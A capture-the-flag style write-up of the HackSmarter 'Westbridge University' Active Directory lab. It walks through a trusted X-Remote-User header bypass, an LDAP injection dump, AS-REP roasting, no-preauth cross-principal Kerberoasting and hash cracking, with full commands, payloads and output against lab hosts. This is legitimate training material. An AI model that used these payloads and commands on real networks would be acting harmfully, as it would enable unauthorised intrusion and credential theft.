---
layout: post
title: "HackSmarter: Westbridge University (Range)"
categories: [HackSmarter]
tags: [windows-ad, range, trusted-header-bypass, ldap-injection, asrep-roast, no-preauth, cross-principal-tgs, kerberoast, bloodhound, forest-trust, shadow-credentials, silver-ticket, crystalpotato, seimpersonate, esc4, adcs, tombstone, rbcd, dcsync, ksu, keytab, constrained-delegation]
tag_anchors:
  trusted-header-bypass: "#32-demonstrating-the-bypass--x-remote-user"
  windows-ad: "#1-reconnaissance"
  ldap-injection: "#4-ldap-injection--full-user-dump"
  asrep-roast: "#5-as-rep-roasting--svc_legacy"
  no-preauth: "#6-the-payoff--no-preauth-cross-principal-tgs-abuse"
  cross-principal-tgs: "#6-the-payoff--no-preauth-cross-principal-tgs-abuse"
  kerberoast: "#6-the-payoff--no-preauth-cross-principal-tgs-abuse"
  bloodhound: "#8-bloodhound-intel--the-bigger-picture"
  forest-trust: "#81-a-second-forest"
  shadow-credentials: "#84-non-default-acl-edges"
---

<img src="/assets/images/westbridge-logo.png" alt="Westbridge University" style="max-width:400px; display:block; margin:20px auto;" />

# Engagement Brief: Westbridge University

Westbridge University is a prestigious, well-funded academic institution. In response to the escalating cyber threats targeting higher education, their IT team has spent the past year hardening their Active Directory infrastructure.

You have been engaged to conduct a comprehensive penetration test against their internal network. Your objective: identify all exploitable vulnerabilities and attempt to escalate privileges to Domain Admin to demonstrate maximum impact.

| | |
| :--- | :--- |
| **Lab Target** | HackSmarter — Westbridge University (Range) |
| **Objective** | Full compromise of `westbridge.hsm` & `westbridge-research.hsm` |
| **Attacker IP** | `192.168.211.2` (`tun0`) |
| **Target Subnets** | `10.0.10.0/24` & `10.0.20.0/24` |
| **Difficulty** | Hard |

---

# Prologue

Welcome to the WESTBRIDGE estate. In modern Active Directory exploitation, You rarely need a shiny zero-day to burn a forest to the ground. You just need a compounding series of administrative shortcuts. This write-up is a deep dive into exploiting the connective tissue of a Windows environment, navigating a dual-forest architecture (`WESTBRIDGE.HSM` and `WESTBRIDGE-RESEARCH.HSM`) where every misconfiguration is a stepping stone, and trust is the ultimate vulnerability.

Across seven hosts, seven flags, and nineteen stages, we’ll ping-pong from a leaky `robots.txt` all the way to a cross-forest DCSync. Along the way, we’ll forge Silver Tickets to bypass humans, weaponize DNS coercion, practice a little AD necromancy by resurrecting tombstones for `GenericAll` rights, and abuse ADCS (ESC4) to mint our own Domain Admin credentials. No magic tricks, just pure protocol abuse.

> Grab your coffee — it’s time to follow the white rabbit to the Domain Controller. 🐇

---

## TL;DR (Too Long; Domain Ruined)

*(Look, I know a seven-paragraph TL;DR is an oxymoron. But when you compromise two forests, seven hosts, and pull off AD necromancy, "short" is a relative term. If you want the absolute shortest version: we started at a leaky `robots.txt` and ended with `krbtgt`. Here is the stuff in between.)*

**[WEB](#1-reconnaissance) ➜ [SQL](#9-pivot--the-hidden-sql-host) (westbridge.hsm).** Trusted-header bypass (`X-Remote-User`) + LDAP injection dump 38 users; AS-REP roast `svc_legacy`; no-preauth cross-principal TGS abuse lands `svc_mssql`'s TGS (etype-23 RC4); crack it ➜ `sqls3rv3r`; pivot to hidden SQL host (`sql.westbridge.hsm`, `10.0.10.20`, never on the wire until now); silver ticket for `MSSQL Maintenance` (RID 9497), `xp_cmdshell` (SeImpersonatePrivilege ➜ CrystalPotato) ➜ SYSTEM; restore `Westbridge.bak` ➜ `m.thompson : Pa$$w0rd` in the restored DB.

**[FILES](#11-mapping-the-ous--who-lives-where) (westbridge.hsm).** m.thompson's GenericAll over Students-OU moves `r.anderson` and `c.wilson` into it and resets at will; r.anderson opens Scripts share, `webserver_monitor.ps1` runs as `svc_webmonitor` against three FQDNs; DNS records point at us, catch NetNTLMv2 (`eazypassword`); plant a shadow credential on `svc_files` via `svc_webmonitor`'s AddKeyCredentialLink; S4U2Proxy as Administrator via `svc_files`'s constrained delegation ➜ local Admin on FILES.

**[WEB](#14-web--ssh-key--cron--and-a-kerberos-shortcut) (westbridge.hsm).** IT-Share kept WEB's SSH private key; SSH in as `svc_web` despite the SSSD fully-qualified-name quirk; cron-hijack the group-writable backup script ➜ `e.mitchell`. Two ways to root: crack d.reynolds' bcrypt (`Password123`) from `users.json` + sudo, or mint an AD user named `root` and let `ksu` map `root@REALM` onto local root. Root on WEB drops two keytabs: `/etc/krb5.keytab` leaks the hidden `HTTP/supportportal.westbridge.hsm` SPN, and `/etc/svc_krb_t2.keytab` is the Tier-2 provisioning account's full identity (GenericAll over IT TIER2).

**[HELPDESK-WS](#15-helpdesk-ws--the-tier-2-play) (westbridge.hsm).** Root on WEB exposes `/etc/svc_krb_t2.keytab` — full Kerberos identity for the Tier-2 provisioning account. GenericAll over IT TIER2 (formalised via `add genericAll` first) resets `s.harrison`; `STATUS_INVALID_LOGON_HOURS` cleared with one octet-string write; HelpDesk Workstation Admins membership ➜ WinRM Pwn3d.

**[DC](#16-apherson--resurrecting-the-dead) (westbridge.hsm).** Helpdesk toolbox hides `domain_defaultPW.xml`; password fits `a.pherson` (expired-on-first-login, "cannot change password") ➜ bypassed via `kpasswd` on port 464. Lifecycle rights into `CN=Deleted Objects`: restore three tombstones; access j.dillon's existing GenericAll over IT TIER3; reset `a.owen` of CA-Manager; **ESC4** via `msPKI-Certificate-Name-Flag` on the SmartCardAuthentication template — flip `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (0 ➜ 1), enroll as Administrator via SAN, PKINIT the real NT hash ➜ Domain Admin.

**[WEB](#18-crossing-the-trust--westbridge-researchhsm) (westbridge-research.hsm).** Trust memo names `researchoperator` as the sanctioned bridge; KeePass DB supplies its password. ligolo into 10.0.20.0/24; cross-realm referral TGT proves the trust. Support-portal chat: Research Web Operations **Global ➜ Universal ➜ Domain Local** (group-type abuse via `groupType`; ownership ≠ permission — first grant yourself GenericAll); join by foreign SID; collect password-reset rights over three accounts. Reset `r.parker` onto the research web server; targeted-kerberoast `j.bones` through t.walker's GenericWrite; webshell as the app pool; CrystalPotato ➜ SYSTEM.

**[DC02](#195-lsa-secrets--the-machine-that-owns-dc02) (westbridge-research.hsm).** LSA secrets yield `WEB$`'s AES256 machine key and `a.howard`'s credentials. `a.howard`'s GenericWrite over `DC02$` is used to configure RBCD, authorizing `WEB$` to delegate. S4U impersonates Administrator against `cifs/DC02`; DCSync pours out every NT hash and Kerberos key in WESTBRIDGE-RESEARCH.HSM, krbtgt included. AES-key TGT ➜ winrmexec lands on DC02 as `wbresearch\administrator`.

**Two forests, seven hosts, seven flags — no zero-days.**

> *Already tired? Consider this summary a minor Denial of Service attack on your attention span. Take a breath; the actual deep dive starts now.*

---

# 1. Reconnaissance

## 1.1 Network Discovery

First, fix connectivity to the range (MTU issue over OpenVPN), then sweep the subnet:

```bash
➜ sudo ip link set dev tun0 mtu 1200

➜ fping -aqg 10.0.10.0/24
10.0.10.5
10.0.10.10
10.0.10.15
```

Three live hosts. Fingerprinting them:

```bash
➜ nxc smb 10.0.10.0/24
SMB         10.0.10.15      445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)

➜ nxc ssh 10.0.10.0/24
SSH         10.0.10.10      22     10.0.10.10       [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.18
```

### 1.1.1 Initial Analysis

* **DC (`10.0.10.5`)** is the Domain Controller for `westbridge.hsm`. SMB signing is enforced (NTLM relay to SMB is dead on arrival), but **null auth is allowed** — anonymous enumeration is on the table.
* **WEB (`10.0.10.10`)** is Ubuntu with SSH and, per the hostname, the web tier. In labs like this the Linux box usually holds initial access.
* **FILES (`10.0.10.15`)** is a pure member server — SMB/RDP/WinRM only.

Kerberos is picky about names, so hosts first:

```bash
10.0.10.5     DC.westbridge.hsm westbridge.hsm DC
10.0.10.15    FILES.westbridge.hsm FILES
10.0.10.10    WEB.westbridge.hsm
```

## 1.2 Port Scans

Full scans of each host with default scripts:

### 1.2.1 WEB — 10.0.10.10

```bash
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a2:09:8c:42:a4:89:99:f4:02:f7:38:4f:b8:26:c4:89 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJUcS64255EOKZJIZAhJLudeJCIqpF1ggBGs70kr5ShnOKBi5tZv2tIU794xGzC5LOoWFCeznECJShpkt8li5Bk=
|   256 67:32:4e:26:3c:61:7d:25:10:33:ee:39:51:d1:01:c6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDL7q2IpQ8akgV7wsc5BWRAW5SW86nxsGH/KqGJI4p5Q
80/tcp   open  http    syn-ack Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Westbridge University | Excellence in Education & Research
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
5000/tcp open  http    syn-ack Werkzeug httpd 3.1.8 (Python 3.12.3)
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: Werkzeug/3.1.8 Python/3.12.3
|_http-title: Did not follow redirect to /login
| http-robots.txt: 1 disallowed entry
|_/static/people-directory.conf.bak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two HTTP services and — the moment I saw it — the standout finding:

> **robots.txt disallows `/static/people-directory.conf.bak`.**

A `.bak` config file, hidden behind robots.txt, on a Flask app. That's rarely accidental.

### 1.2.2 DC — 10.0.10.5

```bash
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2026-08-22 18:27:25Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: westbridge.hsm, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.westbridge.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.westbridge.hsm
| Issuer: commonName=CA01-AD-CA/domainComponent=westbridge
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-04T17:04:11
| Not valid after:  2027-07-04T17:04:11
| MD5:     69d0 0b64 a174 8d8f 5af8 47c2 9925 4ff6
| SHA-1:   1520 b7f0 d1ac af9e 9453 7dc9 bc02 b897 7e20 508f
| SHA-256: 9d1a f795 bc5e ab84 fa1a 8383 b947 593f 0679 74a4 0ac1 7c9c a761 b72f c616 ebe5
...
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: westbridge.hsm, Site: Default-First-Site-Name)
| Issuer: commonName=CA01-AD-CA/domainComponent=westbridge  (same cert as :389)
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: westbridge.hsm, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| Issuer: commonName=CA01-AD-CA/domainComponent=westbridge  (same cert as :389)
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: westbridge.hsm, Site: Default-First-Site-Name)
| Issuer: commonName=CA01-AD-CA/domainComponent=westbridge  (same cert as :389)
3389/tcp  open  ms-wbt-server syn-ack
| ssl-cert: Subject: commonName=DC.westbridge.hsm
| Issuer: commonName=DC.westbridge.hsm  (self-signed — *different* cert from :389, not issued by the AD CS)
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-02T12:41:18
| Not valid after:  2027-01-01T12:41:18
|_ssl-date: TLS randomness does not represent time
| rdp-ntlm-info:
|   Target_Name: WESTBRIDGE
|   NetBIOS_Domain_Name: WESTBRIDGE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: westbridge.hsm
|   DNS_Computer_Name: DC.westbridge.hsm
|   DNS_Tree_Name: westbridge.hsm
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-22T18:28:23+00:00
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         syn-ack Microsoft Windows RPC
49720/tcp open  msrpc         syn-ack Microsoft Windows RPC
49732/tcp open  msrpc         syn-ack Microsoft Windows RPC
49751/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

A standard AD surface: DNS(53), Kerberos(88), LDAP/LDAPS(389/636), SMB(445), Global Catalog(3268), RPC, WinRM(5985). Two details worth flagging from the TLS certs:

* The same `CA01-AD-CA` cert serves ports 389, 636, 3268, and 3269 — there's an **AD CS certificate authority** in this domain, ESC-hunting territory once we have credentials.
* Port 3389's RDP cert is *self-signed* by `DC.westbridge.hsm` itself, not issued by the AD CS — different cert, different chain. Worth knowing for any cert-template-based attacks later.

### 1.2.3 FILES — 10.0.10.15

```bash
PORT      STATE SERVICE       REASON  VERSION
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
3389/tcp  open  ms-wbt-server syn-ack
| rdp-ntlm-info:
|   Target_Name: WESTBRIDGE
|   NetBIOS_Domain_Name: WESTBRIDGE
|   NetBIOS_Computer_Name: FILES
|   DNS_Domain_Name: westbridge.hsm
|   DNS_Computer_Name: FILES.westbridge.hsm
|   DNS_Tree_Name: westbridge.hsm
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-22T18:39:34+00:00
| ssl-cert: Subject: commonName=FILES.westbridge.hsm
| Issuer: commonName=FILES.westbridge.hsm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-02T19:53:42
| Not valid after:  2027-01-01T19:53:42
| MD5:     73cd 6957 19fc b4e8 3664 93aa 8924 ea2f
| SHA-1:   a806 59e5 b095 a802 19df 72a5 3105 a03d 699f f84d
| SHA-256: bc00 3aa2 aeca c6bf 5028 bb8e d55a e6c0 5c72 fb42 48d7 f6b3 5078 774a 4172 3826
...
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

Minimal: RPC endpoints, SMB, RDP, WinRM. Nothing exposed beyond Windows defaults — this box is a destination, not a starting point.

## 1.3 Credential-less SMB Checks

With null auth flagged on the DC, quick wins first:

```bash
➜ nxc smb dc.westbridge.hsm -u '' -p ''
SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.10.5       445    DC               [+] westbridge.hsm\:

➜ nxc smb dc.westbridge.hsm -u guest -p ''
SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\guest: STATUS_ACCOUNT_DISABLED
```

Null session works but guest is disabled, and share enumeration as anonymous yields nothing useful here. Nothing on SMB — let's pivot to web.

> Note: All in-line timestamps below are from the original August run; only publication date updated to 2026-09-08.
---

# 2. The Web Tier

## 2.1 Port 80 — Static University Site

```bash
➜ curl -I http://10.0.10.10
HTTP/1.1 200 OK
Date: Sat, 22 Aug 2026 18:37:15 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Sat, 18 Jul 2026 13:12:23 GMT
ETag: "9fd3-656e26c7d1bc0"
Accept-Ranges: bytes
Content-Length: 40915
Vary: Accept-Encoding
Content-Type: text/html
```

![University landing page](/assets/images/westbridge-web-port80.png)

A static marketing site for "Westbridge University" — no forms, no dynamic content, nothing to attack. Site staff names do line up with the LDAP dump later, but the names alone don't unlock anything; the directory is the source of truth. Moving on.

## 2.2 Port 5000 — People Directory

Port 5000 redirects to `/login`:

```bash
➜ curl -I http://10.0.10.10:5000
HTTP/1.1 302 FOUND
Server: Werkzeug/3.1.8 Python/3.12.3
Date: Sat, 22 Aug 2026 18:45:37 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 199
Location: /login
Connection: close
```

![People Directory login page](/assets/images/westbridge-web-port5000-login.png)

A Flask app behind Werkzeug — the university's internal People Directory. And remember what nmap found in robots.txt...

---

# 3. The People Directory Bypass

The robots.txt entry points at a leftover config file — and it tells us everything about how the app authenticates users before we even send a request.

## 3.1 Information Disclosure — people-directory.conf.bak

```bash
➜ wget http://web.westbridge.hsm:5000/static/people-directory.conf.bak

➜ cat people-directory.conf.bak
# Westbridge University
# People Directory - Legacy Reverse Proxy Configuration
# DEPRECATED - retained for migration compatibility

<VirtualHost *:80>
    ServerName directory.westbridge.hsm

    ProxyPreserveHost On

    # Authentication is performed by the university SSO gateway.
    # Forward authenticated identity to the directory backend.
    RequestHeader set X-Remote-User "%{REMOTE_USER}s"

    ProxyPass        / http://127.0.0.1:5000/
    ProxyPassReverse / http://127.0.0.1:5000/

    ErrorLog  ${APACHE_LOG_DIR}/directory_error.log
    CustomLog ${APACHE_LOG_DIR}/directory_access.log combined
</VirtualHost>
```

This is the whole game in eleven lines. Reading it as an attacker:

1. In the *intended* architecture, Apache sits in front of Flask. The SSO gateway authenticates the user, Apache sets `X-Remote-User` to the authenticated identity, and proxies everything to `127.0.0.1:5000`.
2. The Flask app **trusts that header completely** — it never re-authenticates. It can afford to, because only Apache could set it... *through the proxy*.
3. But the app also listens directly on `:5000`, reachable from anywhere on the network. Nothing strips attacker-supplied headers there.

This is the classic **trusted header authentication bypass**: whenever an app derives identity from a header (`X-Remote-User`, `X-Forwarded-User`, `REMOTE_USER`, ...) without cryptographic proof, anyone who can reach the app *directly* becomes anyone they want.

## 3.2 Demonstrating the Bypass — `X-Remote-User`

Proving it — same request, one added header:

```bash
➜ curl -I http://10.0.10.10:5000/
HTTP/1.1 302 FOUND
Server: Werkzeug/3.1.8 Python/3.12.3
Date: Sat, 22 Aug 2026 19:03:21 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 199
Location: /login
Connection: close

➜ curl -I \
  -H 'X-Remote-User: admin' \
  http://10.0.10.10:5000/
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.12.3
Date: Sat, 22 Aug 2026 19:03:31 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 44768
Connection: close
```

![Burp — adding X-Remote-User: admin bypasses login](/assets/images/westbridge-burp-xremoteuser.png)

No password, no session — just claim an identity in a header and the app believes you. We're "admin" inside the People Directory.

Exploring the authenticated app turns up a JSON search endpoint:

```
GET /api/search?q=<term>
```

and a Help page with a suspicious amount of detail about what's *not* shown:

> 🔒 Sensitive information (passwords, hashes, SPNs) are never displayed.

When an app tells you what it hides, it's telling you what it queries. Directory data like this comes from LDAP — and LDAP filters are built by string concatenation far too often.

---

# 4. LDAP Injection — Full User Dump

## 4.1 Finding the Injection

Baseline behavior first. A normal term returns zero results (the searchable attributes are empty in this dataset), and a bare wildcard `*` returns zero too — which makes no sense for an LDAP-backed directory unless our input lands somewhere unusual in the filter:

```
/api/search?q=a      -> {"count":0}
/api/search?q=*      -> {"count":0}
```

So let's break out of whatever clause the app builds and append our own:

```
GET /api/search?q=*)(objectClass=* HTTP/1.1
Host: web.westbridge.hsm:5000
X-Remote-User: admin
```

![Burp — LDAP injection breakout](/assets/images/westbridge-burp-ldap-inject-01.png)

```json
{"count": 38, ...}
```

![Burp — 38 accounts dumped](/assets/images/westbridge-burp-ldap-inject-02.png)

**38 accounts.** If the backend builds something like `(&(cn=<q>))`, our payload turns it into `(&(cn=*)(objectClass=*))` — always true, match everything.

No Burp needed — the whole dump fits in one curl one-liner:

```bash
➜ curl -sG -H 'X-Remote-User: admin' \
  'http://web.westbridge.hsm:5000/api/search' \
  --data-urlencode 'q=*)(objectClass=*' \
  | jq -r '.results[].username' > users.txt

➜ cat users.txt | head -n 2
Administrator
Guest
```

## 4.2 What We Got

> **Note — the web dump was stale/incomplete.** The `people-directory.conf.bak` we pulled is a *deprecated* config (its own header says so), and the data behind the directory app is equally out of date. The dump flags `m.thompson`, `c.wilson`, and `s.adams` as "Member of Administrators" — but that's the People Directory's *own* app-level role, not the live AD picture. Cross-referencing BloodHound later ([Section 8.5](#85-group-map) shows none of them are Domain Admins; their real group memberships are what actually drive the chain. Treat this dump as a *username list*, not an authority on privileges.

The full dump breaks down as:

| Category | Accounts |
|---|---|
| Built-ins | Administrator (RID 500), Guest, krbtgt |
| **Admin-flagged in the People Directory** | `m.thompson` (1103), `c.wilson` (1105), `s.adams` (10608) — an *app-level* role the directory app assigns, **not** AD Domain Admins; their real AD groups are in [Section 8.5](#85-group-map) |
| Service accounts | `svc_legacy`, `svc_mssql`, `svc_files`, `svc_web`, `svc_krb_t2`, `svc_webmonitor` |
| Regular users | ~25 accounts in `f.last` format |

Service accounts are classic attack-surface: kerberoast candidates when they hold an SPN, AS-REP-roast candidates when preauth is disabled. Two stand out from the dump: `svc_krb_t2` ("Tier 2" — generic naming but the suffix is unusual), and `researchoperator` (literally an operator account on a research forest we haven't seen yet, sitting in the home domain).

One limitation worth documenting: injected clauses *after* the breakout are ignored by the backend — every probe (`servicePrincipalName=*`, `userPassword=*`, nonsense filters) returned the identical 38 results. No boolean oracle here; the dump was the win.

---

# 5. AS-REP Roasting — svc_legacy

With 38 usernames and zero passwords, the classic no-credential Kerberos attack is AS-REP roasting: accounts with *"Do not require Kerberos preauthentication"* will hand their own encrypted blob to anyone who asks.

```bash
➜ GetNPUsers.py westbridge.hsm/ \
    -usersfile users.txt \
    -no-pass \
    -dc-ip 10.0.10.5 \
    -request

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User m.thompson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User r.anderson doesn't have UF_DONT_REQUIRE_PREAUTH set
# ... (33 more users tested — all without UF_DONT_REQUIRE_PREAUTH) ...

$krb5asrep$23$svc_legacy@WESTBRIDGE.HSM:73ae62575857584e65c5b3646abbfd90$348f348c5d47ca6283a50050a78c676f8a0df3251dfd44a94013eb5328c347fe0b$046149511ad8aa15ae3f0ffe468b8b65f71349b424e64638a43d0c7d2089ffaf7a$3e697be6c06facc7fb00689e6b33f20a3f87947dcdbb52ff8448ea9fbf40a0af92$b486d7f845905931e3
...
```

One hit out of 38: **`svc_legacy`** has preauthentication disabled. Etype 23 (RC4) — crackable?

Identifying and cracking:

```bash
➜ hashcat --identify /tmp/hash.txt
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol

➜ hashcat -a 0 -m 18200 /tmp/hash.txt /opt/SecLists/rockyou.txt -d 1

...[snip]...
Status...........: Exhausted
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc_legacy@WESTBRIDGE.HSM:73ae62575857584e65c5b3646abb...05931e3
```

**Exhausted.** rockyou didn't crack it — the password isn't in the list. A lot of people would stop here. Don't. The account still has preauth disabled, and that property is worth more than its password.

---

# 6. The Payoff — No-Preauth Cross-Principal TGS Abuse

## 6.1 Why This Works

> I already walked the protocol-level mechanism behind this — the AS-REQ `sname` trick (Charlie Clark / Semperis' ["as-requested STs"](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/) discovery) and how NetExec's `--no-preauth-targets` exploits it — in my [Gotham (BarbHack24) writeup, Section 3.3](https://secretmyth.blog/netexec/nxc-barbhack24-gotham/#33-kerberoasting-without-authentication). That's the *why* of unauthenticated Kerberoasting. This section focuses on the **Westbridge-specific twist**: the *cross-principal* TGS abuse that reaches accounts normal Kerberoasting never could.

Two facts matter for this box, restated so the rest of the chain makes sense:

1. An account with `UF_DONT_REQUIRE_PREAUTH` lets the KDC skip the "prove you know your key" check **for any request claiming that identity** — and the KDC never verifies the requester *is* `svc_legacy` either. It just issues the TGT.
2. Holding that TGT, you can ask the KDC for service tickets to *any* SPN you name — including principals that aren't service accounts.

The Gotham writeup used this against a service account that already had an SPN (`joker`). Westbridge goes further: the same no-preauth TGT requests a TGS for **accounts with no SPN at all** — that's the *cross-principal* twist, and why `svc_legacy` (whose hash we never cracked) still yielded krbtgt / svc_mssql / svc_files / svc_krb_t2.

## 6.2 Execution

```bash
➜ GetUserSPNs.py westbridge.hsm/ \
    -usersfile users.txt \
    -no-preauth svc_legacy \
    -dc-host 10.0.10.5

[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: krbtgt - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
...
$krb5tgs$18$krbtgt$WESTBRIDGE.HSM$*krbtgt*$159d0ffc3efbe38349bcea62$41f0ea55fe840ed0fea2aaad9ed32064c29f0f2b7f1465912d7f698c41cca1f3ec$e904fb780f835db21914d1f5eb79e3d834723322a731e44cdb73999830e6c51c4c$07abdb725cdd8b393e6d82bc03b7b1cbbdad747ac8afb0a09fa69c6da2639db8ca$d610ea2d3d8387e094ab8d594651efb8aad7d57c1464cdf4bb04d68a9b6b4b998...
...
$krb5tgs$23$*svc_mssql$WESTBRIDGE.HSM$svc_mssql*$1528fc999bc1703f5b593$3e9850f7380$aeafb8753b46b03feaf3ae59a5a540969185588b7cdc2ad1fb009537$010ca7f643b911584b8e1eaf9573266474ee4cdb94f149ac99678db98090fa2355$b1f42ecf76dd802f2e190c01e6ce00dae1fffb74a273e26208ec0cdec4801732fe$3bc37014971d93f04f60ab6ba9d6567fec39559a2f606d716a1db4c510d96ceb...
...
$krb5tgs$18$svc_files$WESTBRIDGE.HSM$*svc_files*$de446d9287008dd5868c8$a9f$5348cd51a2e36271230376c498aad29825754f6f8ec076d2f8b4778f86cf8d$4114ec07bed888d74385fab21e38e0b4f99da33705b92b1d0a3e72b07f19f6e7e6$8e59a93dfb57de3aff53438e4a3655c63046aff0eda055060e241a9697fdaf3654$147e652a28409b35f3662dfe67468bff926dd36a487c0213bc3c788f92560bb92...
...
$krb5tgs$18$svc_krb_t2$WESTBRIDGE.HSM$*svc_krb_t2*$8ba406d3ea7659a21$d6adc1c$663121f7137e84bce12585ffe3b14796000e18a6e67cd6e7fbed858efb$2857ae04955f2eed393dbd2943786a521070d88fd126dcd3a1b0cc1f2ed18a1e1$8bc7a8f47b5d571dd995626cc40b603dba503a2b4d3f57cf6f734e1e7f6128c51$344a4525938c78110c27ce8c635516d096f28b5522d1a9758060d4e051f2c4dfa$2079...
```

Four hashes — and look at the names:

| Principal | Etype | Significance |
|---|---|---|
| **krbtgt** | 18 (AES256) | The domain's master key. Crack it ➜ golden tickets. |
| **svc_mssql** | 23 (RC4) | Fast-crack candidate |
| **svc_files** | 18 (AES256) | File server service account (SPN: `HOST/FILES.westbridge.hsm`) |
| **svc_krb_t2** | 18 (AES256) | "Tier 2 provisioning" — interesting |

> *Note: `KDC_ERR_S_PRINCIPAL_UNKNOWN` here means "no SPN registered on this principal" — not "no such account". Administrator, Guest, and krbtgt exist as accounts but have no SPN by default, so the request for a service ticket for them fails. The next 30 users follow the same pattern.*

Cracking `krbtgt`'s AES256 key offline would be a long shot, but RC4 is cheap to try:

```bash
➜ hashcat --identify /tmp/hash.txt
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol

➜ hashcat -a 0 -m 13100 /tmp/hash.txt /opt/SecLists/rockyou.txt -d 1

...[snip]...
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_mssql$WESTBRIDGE.HSM$svc_mssql*$15...34a451
```

**Cracked:** `svc_mssql` : `sqls3rv3r` 🎉

## 6.3 Validating Access

First check: does the crack hold up on the DC?

```bash
➜ nxc smb 10.0.10.5 \
    -u svc_mssql -p 'sqls3rv3r'
SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.10.5       445    DC               [+] westbridge.hsm\svc_mssql:sqls3rv3r
```

It does — the crack is real. Everything this credential opens is the next section's job: share enumeration on FILES first, then the full protocol matrix.

---

